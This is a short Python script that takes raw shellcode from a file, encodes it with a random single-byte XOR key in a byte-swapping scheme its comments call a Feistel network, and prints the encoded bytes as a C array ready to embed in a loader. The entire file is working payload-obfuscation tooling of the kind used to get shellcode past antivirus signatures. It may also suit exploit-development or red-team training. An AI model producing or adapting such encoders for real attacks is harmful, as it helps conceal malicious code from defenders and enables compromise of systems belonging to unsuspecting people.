# read shellcode from `shellcode.bin` and 
# generate the encoded shellcode

import random

with open("shellcode.bin", "rb") as f:
    shcode = f.read()
shlen = len(shcode)

# generate single byte key
key = random.randrange(1, 255)

# make sure shellcode is even-length
if shlen % 2 == 1:
    shcode += b"\x00"
    shlen  += 1

# process in feistel network
enc_shcode = [key]
idx = 0
while idx < shlen:
    l = shcode[idx]     # LEFT
    r = shcode[idx+1]   # RIGHT

    enc_shcode.append(r)
    enc_shcode.append(l ^ key)
    idx += 2

# print as C-array
print("{ ", end='')
print(",".join("0x{:02x}".format(c) for c in enc_shcode), end='')
print(" }")